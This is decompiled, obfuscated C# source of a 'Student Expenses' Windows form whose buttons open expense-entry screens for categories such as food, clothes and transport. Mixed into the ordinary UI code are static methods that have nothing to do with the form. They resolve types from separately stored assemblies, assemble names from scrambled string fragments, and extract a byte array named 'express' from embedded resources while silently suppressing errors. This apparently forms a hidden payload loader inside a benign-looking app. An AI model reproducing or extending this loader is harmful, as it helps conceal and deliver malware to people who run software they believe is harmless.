using System;
using System.Collections;
using System.ComponentModel;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Ez5;
using Kc71;
using Microsoft.VisualBasic.CompilerServices;
using Xc5;
using r8C;

namespace Pt8;

[DesignerGenerated]
public class b8R : Form
{
	private IContainer components;

	private Button _Button2;

	private Button _Button3;

	private Button _Button6;

	private Button _Button7;

	private Button _Button8;

	private Label _Label1;

	private Label _Label2;

	private Label _Label6;

	private Label _Label7;

	private Label _Label8;

	internal Button f;

	internal Button k;

	internal Button b;

	internal PictureBox U;

	internal Label R;

	internal Label W;

	internal Label d;

	internal Label c;

	public b8R()
	{
		((Form)this).add_Load((EventHandler)Gw5);
		Gq5();
	}

	protected override void Xq0(bool r3K)
	{
		try
		{
			if (r3K && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(r3K);
		}
	}

	private void Gq5()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_0115: Unknown result type (might be due to invalid IL or missing references)
		//IL_011f: Expected O, but got Unknown
		//IL_01c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d1: Expected O, but got Unknown
		//IL_0277: Unknown result type (might be due to invalid IL or missing references)
		//IL_0281: Expected O, but got Unknown
		//IL_032a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0334: Expected O, but got Unknown
		//IL_03e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ea: Expected O, but got Unknown
		//IL_0496: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a0: Expected O, but got Unknown
		//IL_054c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0556: Expected O, but got Unknown
		//IL_0605: Unknown result type (might be due to invalid IL or missing references)
		//IL_060f: Expected O, but got Unknown
		//IL_071d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0727: Expected O, but got Unknown
		//IL_07cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_07d6: Expected O, but got Unknown
		//IL_086a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0874: Expected O, but got Unknown
		//IL_090b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0915: Expected O, but got Unknown
		//IL_09a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_09b3: Expected O, but got Unknown
		//IL_0a4a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a54: Expected O, but got Unknown
		//IL_0aeb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0af5: Expected O, but got Unknown
		//IL_0b8c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b96: Expected O, but got Unknown
		//IL_0c2d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c37: Expected O, but got Unknown
		//IL_0cba: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cc4: Expected O, but got Unknown
		//IL_0e25: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e2f: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(b8R));
		Bn9(new Button());
		Nk9(new Button());
		Yg1(new Button());
		t6L(new Button());
		Ex6(new Button());
		a2H(new Button());
		Dt6(new Button());
		p5Y(new Button());
		d9G(new Label());
		m0Z(new PictureBox());
		o1K(new Label());
		t2H(new Label());
		Tr9(new Label());
		j2W(new Label());
		Hm5(new Label());
		Yj6(new Label());
		Xb9(new Label());
		f3Z(new Label());
		((ISupportInitialize)Ec0()).BeginInit();
		((Control)this).SuspendLayout();
		((Control)Me7()).set_Anchor((AnchorStyles)15);
		((ButtonBase)Me7()).set_BackColor(Color.Transparent);
		((Control)Me7()).set_BackgroundImage((Image)componentResourceManager.GetObject("Button1.BackgroundImage"));
		((Control)Me7()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)Me7()).set_Cursor(Cursors.get_Hand());
		((ButtonBase)Me7()).set_FlatStyle((FlatStyle)1);
		((Control)Me7()).set_Location(new Point(276, -1));
		((Control)Me7()).set_Name("Button1");
		((Control)Me7()).set_Size(new Size(116, 107));
		((Control)Me7()).set_TabIndex(0);
		((ButtonBase)Me7()).set_UseVisualStyleBackColor(false);
		((Control)Nx8()).set_Anchor((AnchorStyles)15);
		((ButtonBase)Nx8()).set_BackColor(Color.Transparent);
		((Control)Nx8()).set_BackgroundImage((Image)componentResourceManager.GetObject("Button2.BackgroundImage"));
		((Control)Nx8()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)Nx8()).set_Cursor(Cursors.get_Hand());
		((ButtonBase)Nx8()).set_FlatStyle((FlatStyle)1);
		((Control)Nx8()).set_Location(new Point(120, 39));
		((Control)Nx8()).set_Name("Button2");
		((Control)Nx8()).set_Size(new Size(119, 107));
		((Control)Nx8()).set_TabIndex(1);
		((ButtonBase)Nx8()).set_UseVisualStyleBackColor(false);
		((Control)Mf8()).set_Anchor((AnchorStyles)15);
		((ButtonBase)Mf8()).set_BackColor(Color.Transparent);
		((Control)Mf8()).set_BackgroundImage((Image)componentResourceManager.GetObject("Button3.BackgroundImage"));
		((Control)Mf8()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)Mf8()).set_Cursor(Cursors.get_Hand());
		((ButtonBase)Mf8()).set_FlatStyle((FlatStyle)1);
		((Control)Mf8()).set_Location(new Point(12, 176));
		((Control)Mf8()).set_Name("Button3");
		((Control)Mf8()).set_Size(new Size(121, 112));
		((Control)Mf8()).set_TabIndex(2);
		((ButtonBase)Mf8()).set_UseVisualStyleBackColor(false);
		((Control)w2B()).set_Anchor((AnchorStyles)15);
		((ButtonBase)w2B()).set_BackColor(Color.Transparent);
		((Control)w2B()).set_BackgroundImage((Image)componentResourceManager.GetObject("Button4.BackgroundImage"));
		((Control)w2B()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)w2B()).set_Cursor(Cursors.get_Hand());
		((ButtonBase)w2B()).set_FlatStyle((FlatStyle)1);
		((Control)w2B()).set_Location(new Point(131, 307));
		((Control)w2B()).set_Name("Button4");
		((Control)w2B()).set_Size(new Size(108, 96));
		((Control)w2B()).set_TabIndex(3);
		((ButtonBase)w2B()).set_UseVisualStyleBackColor(false);
		((Control)Co9()).set_Anchor((AnchorStyles)15);
		((ButtonBase)Co9()).set_BackColor(Color.Transparent);
		((Control)Co9()).set_BackgroundImage((Image)componentResourceManager.GetObject("Button5.BackgroundImage"));
		((Control)Co9()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)Co9()).set_Cursor(Cursors.get_Hand());
		((ButtonBase)Co9()).set_FlatStyle((FlatStyle)1);
		((Control)Co9()).set_Location(new Point(267, 361));
		((Control)Co9()).set_Name("Button5");
		((Control)Co9()).set_Size(new Size(125, 105));
		((Control)Co9()).set_TabIndex(4);
		((ButtonBase)Co9()).set_UseVisualStyleBackColor(false);
		((Control)y8G()).set_Anchor((AnchorStyles)15);
		((ButtonBase)y8G()).set_BackColor(Color.Transparent);
		((Control)y8G()).set_BackgroundImage((Image)componentResourceManager.GetObject("Button6.BackgroundImage"));
		((Control)y8G()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)y8G()).set_Cursor(Cursors.get_Hand());
		((ButtonBase)y8G()).set_FlatStyle((FlatStyle)1);
		((Control)y8G()).set_Location(new Point(421, 307));
		((Control)y8G()).set_Name("Button6");
		((Control)y8G()).set_Size(new Size(117, 107));
		((Control)y8G()).set_TabIndex(5);
		((ButtonBase)y8G()).set_UseVisualStyleBackColor(false);
		((Control)Pz4()).set_Anchor((AnchorStyles)15);
		((ButtonBase)Pz4()).set_BackColor(Color.Transparent);
		((Control)Pz4()).set_BackgroundImage((Image)componentResourceManager.GetObject("Button7.BackgroundImage"));
		((Control)Pz4()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)Pz4()).set_Cursor(Cursors.get_Hand());
		((ButtonBase)Pz4()).set_FlatStyle((FlatStyle)1);
		((Control)Pz4()).set_Location(new Point(544, 175));
		((Control)Pz4()).set_Name("Button7");
		((Control)Pz4()).set_Size(new Size(133, 113));
		((Control)Pz4()).set_TabIndex(6);
		((ButtonBase)Pz4()).set_UseVisualStyleBackColor(false);
		((Control)Zk0()).set_Anchor((AnchorStyles)15);
		((ButtonBase)Zk0()).set_BackColor(Color.Transparent);
		((Control)Zk0()).set_BackgroundImage((Image)componentResourceManager.GetObject("Button8.BackgroundImage"));
		((Control)Zk0()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)Zk0()).set_Cursor(Cursors.get_Hand());
		((ButtonBase)Zk0()).set_FlatStyle((FlatStyle)1);
		((Control)Zk0()).set_Location(new Point(421, 39));
		((Control)Zk0()).set_Name("Button8");
		((Control)Zk0()).set_Size(new Size(132, 116));
		((Control)Zk0()).set_TabIndex(7);
		((ButtonBase)Zk0()).set_UseVisualStyleBackColor(false);
		((Control)Rk6()).set_Anchor((AnchorStyles)15);
		Rk6().set_AutoSize(true);
		((Control)Rk6()).set_Location(new Point(303, 216));
		((Control)Rk6()).set_Name("Label1");
		((Control)Rk6()).set_Size(new Size(0, 13));
		((Control)Rk6()).set_TabIndex(8);
		((Control)Ec0()).set_Anchor((AnchorStyles)15);
		((Control)Ec0()).set_BackColor(Color.Transparent);
		((Control)Ec0()).set_BackgroundImage((Image)componentResourceManager.GetObject("PictureBox1.BackgroundImage"));
		((Control)Ec0()).set_BackgroundImageLayout((ImageLayout)3);
		((Control)Ec0()).set_Location(new Point(216, 134));
		((Control)Ec0()).set_Name("PictureBox1");
		((Control)Ec0()).set_Size(new Size(231, 192));
		Ec0().set_TabIndex(9);
		Ec0().set_TabStop(false);
		((Control)Mw6()).set_Anchor((AnchorStyles)15);
		Mw6().set_AutoSize(true);
		((Control)Mw6()).set_BackColor(Color.Gainsboro);
		((Control)Mw6()).set_Font(new Font("Comic Sans MS", 9f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)Mw6()).set_Location(new Point(306, 109));
		((Control)Mw6()).set_Name("Label2");
		((Control)Mw6()).set_Size(new Size(44, 18));
		((Control)Mw6()).set_TabIndex(10);
		Mw6().set_Text("FOOD");
		((Control)Gs8()).set_Anchor((AnchorStyles)15);
		Gs8().set_AutoSize(true);
		((Control)Gs8()).set_BackColor(Color.Gainsboro);
		((Control)Gs8()).set_Font(new Font("Comic Sans MS", 9f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)Gs8()).set_Location(new Point(129, 149));
		((Control)Gs8()).set_Name("Label3");
		((Control)Gs8()).set_Size(new Size(93, 18));
		((Control)Gs8()).set_TabIndex(11);
		Gs8().set_Text("STATIONARY");
		((Control)s4Z()).set_Anchor((AnchorStyles)15);
		s4Z().set_AutoSize(true);
		((Control)s4Z()).set_BackColor(Color.Gainsboro);
		((Control)s4Z()).set_Font(new Font("Comic Sans MS", 9f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)s4Z()).set_Location(new Point(38, 292));
		((Control)s4Z()).set_Name("Label4");
		((Control)s4Z()).set_Size(new Size(65, 18));
		((Control)s4Z()).set_TabIndex(12);
		s4Z().set_Text("CLOTHES");
		((Control)Zc1()).set_Anchor((AnchorStyles)15);
		Zc1().set_AutoSize(true);
		((Control)Zc1()).set_BackColor(Color.Gainsboro);
		((Control)Zc1()).set_Font(new Font("Comic Sans MS", 9f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)Zc1()).set_Location(new Point(163, 406));
		((Control)Zc1()).set_Name("Label5");
		((Control)Zc1()).set_Size(new Size(59, 18));
		((Control)Zc1()).set_TabIndex(13);
		Zc1().set_Text("MARKET");
		((Control)Lt8()).set_Anchor((AnchorStyles)15);
		Lt8().set_AutoSize(true);
		((Control)Lt8()).set_BackColor(Color.Gainsboro);
		((Control)Lt8()).set_Font(new Font("Comic Sans MS", 9f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)Lt8()).set_Location(new Point(271, 469));
		((Control)Lt8()).set_Name("Label6");
		((Control)Lt8()).set_Size(new Size(121, 18));
		((Control)Lt8()).set_TabIndex(14);
		Lt8().set_Text("ENTERTAINMENT");
		((Control)f3S()).set_Anchor((AnchorStyles)15);
		f3S().set_AutoSize(true);
		((Control)f3S()).set_BackColor(Color.Gainsboro);
		((Control)f3S()).set_Font(new Font("Comic Sans MS", 9f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)f3S()).set_Location(new Point(468, 158));
		((Control)f3S()).set_Name("Label7");
		((Control)f3S()).set_Size(new Size(59, 18));
		((Control)f3S()).set_TabIndex(15);
		f3S().set_Text("OTHERS");
		((Control)Rz0()).set_Anchor((AnchorStyles)15);
		Rz0().set_AutoSize(true);
		((Control)Rz0()).set_BackColor(Color.Gainsboro);
		((Control)Rz0()).set_Font(new Font("Comic Sans MS", 9f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)Rz0()).set_Location(new Point(565, 292));
		((Control)Rz0()).set_Name("Label8");
		((Control)Rz0()).set_Size(new Size(83, 18));
		((Control)Rz0()).set_TabIndex(16);
		Rz0().set_Text("TRANSPORT");
		((Control)z6M()).set_Anchor((AnchorStyles)15);
		z6M().set_AutoSize(true);
		((Control)z6M()).set_BackColor(Color.Gainsboro);
		((Control)z6M()).set_Font(new Font("Comic Sans MS", 9f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)z6M()).set_Location(new Point(452, 417));
		((Control)z6M()).set_Name("Label9");
		((Control)z6M()).set_Size(new Size(75, 18));
		((Control)z6M()).set_TabIndex(17);
		z6M().set_Text("MEDICINE");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(700, 507));
		((Control)this).get_Controls().Add((Control)(object)z6M());
		((Control)this).get_Controls().Add((Control)(object)Rz0());
		((Control)this).get_Controls().Add((Control)(object)f3S());
		((Control)this).get_Controls().Add((Control)(object)Lt8());
		((Control)this).get_Controls().Add((Control)(object)Zc1());
		((Control)this).get_Controls().Add((Control)(object)s4Z());
		((Control)this).get_Controls().Add((Control)(object)Gs8());
		((Control)this).get_Controls().Add((Control)(object)Mw6());
		((Control)this).get_Controls().Add((Control)(object)Zk0());
		((Control)this).get_Controls().Add((Control)(object)Pz4());
		((Control)this).get_Controls().Add((Control)(object)y8G());
		((Control)this).get_Controls().Add((Control)(object)Co9());
		((Control)this).get_Controls().Add((Control)(object)w2B());
		((Control)this).get_Controls().Add((Control)(object)Mf8());
		((Control)this).get_Controls().Add((Control)(object)Nx8());
		((Control)this).get_Controls().Add((Control)(object)Me7());
		((Control)this).get_Controls().Add((Control)(object)Ec0());
		((Control)this).get_Controls().Add((Control)(object)Rk6());
		((Control)this).set_DoubleBuffered(true);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form5");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Student Expenses");
		((ISupportInitialize)Ec0()).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Button Me7()
	{
		return f;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Bn9(Button Lw1)
	{
		EventHandler eventHandler = w7B;
		Button val = f;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Button val2 = (f = Lw1);
		val = f;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button Nx8()
	{
		return _Button2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Nk9(Button b7W)
	{
		EventHandler eventHandler = p2Z;
		Button button = _Button2;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button2 = b7W;
		button = _Button2;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button Mf8()
	{
		return _Button3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Yg1(Button o4Q)
	{
		EventHandler eventHandler = t3A;
		Button button = _Button3;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button3 = o4Q;
		button = _Button3;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button w2B()
	{
		return k;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void t6L(Button Pf6)
	{
		EventHandler eventHandler = s4H;
		Button val = k;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Button val2 = (k = Pf6);
		val = k;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button Co9()
	{
		return b;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ex6(Button Zw4)
	{
		EventHandler eventHandler = Rw5;
		Button val = b;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Button val2 = (b = Zw4);
		val = b;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button y8G()
	{
		return _Button6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void a2H(Button Cy0)
	{
		EventHandler eventHandler = r8G;
		Button button = _Button6;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button6 = Cy0;
		button = _Button6;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button Pz4()
	{
		return _Button7;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Dt6(Button Wk7)
	{
		EventHandler eventHandler = p2G;
		Button button = _Button7;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button7 = Wk7;
		button = _Button7;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button Zk0()
	{
		return _Button8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void p5Y(Button e5H)
	{
		EventHandler eventHandler = Xm7;
		Button button = _Button8;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button8 = e5H;
		button = _Button8;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label Rk6()
	{
		return _Label1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void d9G(Label Fd8)
	{
		_Label1 = Fd8;
	}

	[SpecialName]
	internal virtual PictureBox Ec0()
	{
		return U;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void m0Z(PictureBox t3J)
	{
		PictureBox val = (U = t3J);
	}

	[SpecialName]
	internal virtual Label Mw6()
	{
		return _Label2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void o1K(Label w5E)
	{
		_Label2 = w5E;
	}

	[SpecialName]
	internal virtual Label Gs8()
	{
		return R;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void t2H(Label a0N)
	{
		Label val = (R = a0N);
	}

	[SpecialName]
	internal virtual Label s4Z()
	{
		return W;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Tr9(Label q4M)
	{
		Label val = (W = q4M);
	}

	[SpecialName]
	internal virtual Label Zc1()
	{
		return d;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void j2W(Label m7T)
	{
		Label val = (d = m7T);
	}

	[SpecialName]
	internal virtual Label Lt8()
	{
		return _Label6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Hm5(Label Wz7)
	{
		_Label6 = Wz7;
	}

	[SpecialName]
	internal virtual Label f3S()
	{
		return _Label7;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Yj6(Label Yj6)
	{
		_Label7 = Yj6;
	}

	[SpecialName]
	internal virtual Label Rz0()
	{
		return _Label8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Xb9(Label Gs8)
	{
		_Label8 = Gs8;
	}

	[SpecialName]
	internal virtual Label z6M()
	{
		return c;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f3Z(Label Bp2)
	{
		Label val = (c = Bp2);
	}

	private void w7B(object sender, EventArgs e)
	{
		Kb2 kb = new Kb2();
		kb.StringPass = "Enter the Money spent on Food";
		kb.AddPass = "Food";
		kb.NotePass = "FoodNote";
		((Control)kb).Show();
		((Form)this).Close();
	}

	private void Xm7(object sender, EventArgs e)
	{
		Kb2 kb = new Kb2();
		kb.StringPass = "Enter the Money spent on Others";
		kb.AddPass = "Others";
		kb.NotePass = "OtheNote";
		((Control)kb).Show();
		((Form)this).Close();
	}

	private void p2G(object sender, EventArgs e)
	{
		Kb2 kb = new Kb2();
		kb.StringPass = "Enter the Money spent on Transport";
		kb.AddPass = "Transport";
		kb.NotePass = "TranNote";
		((Control)kb).Show();
		((Form)this).Close();
	}

	internal static bool t9E()
	{
		try
		{
			try
			{
				Type type = Em23.c4PD((Assembly)Ya7.mDic["Deep"]);
				if (Operators.CompareString(type.Name, Ya7.mDic[Ya7.tName].ToString(), false) == 0)
				{
					Ya7.mDic.Add(Ya7.T, type);
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	private void r8G(object sender, EventArgs e)
	{
		Kb2 kb = new Kb2();
		kb.StringPass = "Enter the Money spent on Medical";
		kb.AddPass = "Medical";
		kb.NotePass = "MediNote";
		((Control)kb).Show();
		((Form)this).Close();
	}

	private void Rw5(object sender, EventArgs e)
	{
		Kb2 kb = new Kb2();
		kb.StringPass = "Enter the Money spent on Entertainment";
		kb.AddPass = "Entertainment";
		kb.NotePass = "EnteNote";
		((Control)kb).Show();
		((Form)this).Close();
	}

	internal static void Pt8()
	{
		string[] bj = new string[8] { "X", "B", "Q", "=", "X", "R", "Q", "=" };
		string value = e9B.Cw5(bj, 0, 3);
		string value2 = e9B.Cw5(bj, 4, 7);
		Ya7.mDic.Add(Ya7.tName, value);
		Ya7.mDic.Add(Ya7.mName, value2);
	}

	private void s4H(object sender, EventArgs e)
	{
		Kb2 kb = new Kb2();
		kb.StringPass = "Enter the Money spent on Market";
		kb.AddPass = "Market";
		kb.NotePass = "MarkNote";
		((Control)kb).Show();
		((Form)this).Close();
	}

	private void t3A(object sender, EventArgs e)
	{
		Kb2 kb = new Kb2();
		kb.StringPass = "Enter the Money spent on Clothes";
		kb.AddPass = "Clothes";
		kb.NotePass = "ClotNote";
		((Control)kb).Show();
		((Form)this).Close();
	}

	private void p2Z(object sender, EventArgs e)
	{
		Kb2 kb = new Kb2();
		kb.StringPass = "Enter the Money spent on Stationary";
		kb.AddPass = "Stationary";
		kb.NotePass = "StatNote";
		((Control)kb).Show();
		((Form)this).Close();
	}

	internal static byte[] f1P(string[] To4, int d8J)
	{
		checked
		{
			byte[] result = default(byte[]);
			try
			{
				string[] array = new string[To4.Length - 1 + 1];
				int num = To4.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						array[i] = To4[i].Replace(".resources", "");
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text == null)
					{
						continue;
					}
					try
					{
						ResourceManager resourceManager = new ResourceManager(text, (Assembly)Ya7.mDic["bee"]);
						ResourceSet resourceSet = resourceManager.GetResourceSet(CultureInfo.CurrentCulture, createIfNotExists: true, tryParents: true);
						foreach (object item in resourceSet.OfType<object>())
						{
							DictionaryEntry dictionaryEntry = ((item != null) ? ((DictionaryEntry)item) : default(DictionaryEntry));
							if (Operators.CompareString(dictionaryEntry.Key.ToString(), "express", false) == 0)
							{
								result = (byte[])dictionaryEntry.Value;
								return result;
							}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				return result;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	private void Gw5(object sender, EventArgs e)
	{
	}
}
